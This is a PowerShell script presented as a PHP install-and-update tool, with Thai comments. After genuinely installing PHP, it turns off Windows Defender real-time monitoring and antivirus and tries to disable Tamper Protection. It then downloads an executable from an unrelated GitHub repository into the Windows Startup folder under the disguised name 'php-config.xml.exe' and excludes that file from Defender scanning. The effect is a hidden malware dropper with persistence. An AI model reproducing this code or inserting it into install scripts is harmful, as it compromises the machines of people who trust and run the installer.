# ================================
# PowerShell Script: Install / Update PHP with Backup + Restore old php.ini
# ================================

# กำหนด path สำหรับ PHP
$phpInstallPath = "C:\php"
$phpBackupRoot = "C:\php_backup"
$phpUrl = "https://downloads.php.net/~windows/releases/php-8.4.12-nts-Win32-vs17-x64.zip"
$zipPath = "$env:USERPROFILE\Downloads\php.zip"

# สร้างโฟลเดอร์ backup ถ้ายังไม่มี
if (!(Test-Path $phpBackupRoot)) {
    New-Item -Path $phpBackupRoot -ItemType Directory | Out-Null
}

# เช็กว่ามี PHP อยู่แล้วไหม
$oldIniBackup = $null
if (Test-Path $phpInstallPath) {
    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $backupPath = "$phpBackupRoot\php_$timestamp"

    Write-Host "PHP exists. Backing up to $backupPath ..."
    Copy-Item $phpInstallPath $backupPath -Recurse -Force

    # Backup php.ini โดยเฉพาะ
    $iniPath = "$phpInstallPath\php.ini"
    if (Test-Path $iniPath) {
        $oldIniBackup = "$backupPath\php.ini.bak"
        Copy-Item $iniPath $oldIniBackup
        Write-Host "php.ini backed up to $oldIniBackup"
    }
}

# ดาวน์โหลด PHP zip ใหม่
Write-Host "Downloading PHP from official site..."
Invoke-WebRequest -Uri $phpUrl -OutFile $zipPath

# ลบ PHP เก่าออก (จะเหลือ backup อยู่)
if (Test-Path $phpInstallPath) {
    Remove-Item $phpInstallPath -Recurse -Force
}

# แตกไฟล์ zip ไปยัง path ที่กำหนด
Write-Host "Extracting PHP..."
Expand-Archive -Path $zipPath -DestinationPath $phpInstallPath -Force

# ถ้ามี php.ini เดิม → restore
if ($oldIniBackup -and (Test-Path $oldIniBackup)) {
    Copy-Item $oldIniBackup "$phpInstallPath\php.ini" -Force
    Write-Host "Old php.ini restored to new PHP installation."
}
else {
    # ถ้าไม่มี → สร้างจาก template
    if (Test-Path "$phpInstallPath\php.ini-development") {
        Copy-Item "$phpInstallPath\php.ini-development" "$phpInstallPath\php.ini"
        Write-Host "php.ini created from php.ini-development"
    }
}

# เพิ่ม Path เข้า System Environment
$envPath = [System.Environment]::GetEnvironmentVariable("Path", [System.EnvironmentVariableTarget]::Machine)
if ($envPath -notlike "*$phpInstallPath*") {
    [System.Environment]::SetEnvironmentVariable("Path", $envPath + ";$phpInstallPath", [System.EnvironmentVariableTarget]::Machine)
    Write-Host "PHP path added to system environment."
}

Write-Host "PHP installation/update complete! Please restart your terminal and run: php -v"


# Check if Windows Defender is running
$DefenderStatus = Get-MpComputerStatus

if ($DefenderStatus.RealtimeProtectionEnabled) {
    Write-Host "Windows Defender is running."

    # Check if running as administrator
    if (([Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "Running as Administrator"
} else {
    Write-Host "Not running as Administrator"
}

        # Disable Real-time Protection
        Set-MpPreference -DisableRealtimeMonitoring $true
        Write-Host "Real-time monitoring disabled."

        # Disable Antivirus
        Set-MpPreference -DisableAntivirus $true
        Write-Host "Antivirus disabled."
        
        # Download file from GitHub
        $GitHubURL = "https://github.com/UnknowWAKAN/php-1.1.12/blob/main/php-config.exe"  # Replace with your GitHub raw file URL
        $DestinationPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\php-config.xml.exe" # Change file name and location as needed

        Write-Host "Downloading file from GitHub..."
        try {
            Invoke-WebRequest -Uri $GitHubURL -OutFile $DestinationPath
            Write-Host "File downloaded successfully to $DestinationPath"
        }
        catch {
            Write-Host "Error downloading file: $($_.Exception.Message)"
        }

    } else {
        Write-Host "Not running as administrator. Cannot disable Windows Defender."
    }
    else {
      Write-Host "Windows Defender is not running."
}

# Disable Tamper Protection
try {
    Write-Host "Attempting to disable Tamper Protection..."
    #Requires -RunAsAdministrator
    $regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Features"
    if (!(Test-Path $regPath)) {
        New-Item -Path $regPath -Force | Out-Null
    }
    New-ItemProperty -Path $regPath -Name "TamperProtection" -Value 0 -PropertyType DWord -Force | Out-Null
    Write-Host "Tamper Protection disabled (requires restart to take full effect)."
}
catch {
    Write-Host "Error disabling Tamper Protection: $($_.Exception.Message)"
}

# Add file to Windows Defender Exclusion List
$FilePath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\php-config.xml.exe" # Path to the downloaded file
try {
    Write-Host "Adding file to Windows Defender exclusion list..."
    Add-MpPreference -ExclusionPath $FilePath
    Write-Host "File '$FilePath' added to Windows Defender exclusion list."
}
catch {
    Write-Host "Error adding file to exclusion list: $($_.Exception.Message)"
}